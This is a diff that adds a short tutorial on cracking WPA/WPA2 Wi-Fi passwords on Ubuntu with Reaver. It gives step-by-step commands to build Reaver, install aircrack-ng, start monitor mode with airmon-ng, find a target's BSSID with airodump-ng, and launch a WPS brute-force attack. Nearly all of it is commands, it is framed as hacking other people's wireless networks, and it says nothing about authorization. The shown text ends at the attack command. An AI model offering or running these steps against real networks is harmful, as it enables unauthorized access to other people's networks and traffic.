@@ -1,0 +1,68 @@
+Steps To Hack WPA/WPA2 Passwords using Ubuntu (Reaver)
+
+Follow these simple steps.
+Step 1 (Setting up Reaver 1.4 )
+
+1) Open terminal and type
+
+sudo -s
+
+and then type your password.
+
+2) Download Reaver (Better Download the Latest Version ) Place in a specified folder.
+
+3) Open the Terminal and type
+
+tar xvfz reaver-1.4.tar.gz
+
+4) Install dependencies
+
+sudo apt-get install libpcap-dev
+
+then
+
+sudo apt-get install libsqlite3-dev
+
+Note: libpcap and libsqlite3 maybe included in your Ubuntu version but they are very important.
+
+5) Enter the folder by typing
+
+cd reaver-1.4/src
+
+6) Type
+
+./configure
+
+7) Type
+
+make
+
+8) Type
+
+ make install
+
+Note: To test if Reaver have been successfully installed, Open a Terminal and Type ‘reaver’ and hit enter, it should list all Reaver’s sub commands.
+Step 2 ( Hacking WPA/WPA2 Wireless)
+
+After installing reaver 1.4, it’s time to proceed to the main part which is hacking wireless passwords that uses WPA/WPA2 Encryption.
+Requirements:
+Install aircrack-ng by typing
+
+sudo apt-get install aircrack-ng
+
+Airodump-ng / Airmon-ng commands
+
+Reaver 1.4 (Install in Step 1)
+
+1) We need to have the wireless BSSID (Mac address) so we use airodump-ng. Open a terminal and Type :
+
+airmon-ng start wlan0
+
+Type
+
+airodump-ng mon0
+
+It will lists the available wireless passwords, now copy the BSSID of the Access Point ( e.g : 00:11:28:32:49:55 )
+2) Starting the attack type:
+
+ reaver -i mon0 -b 00:11:28:32:49:55
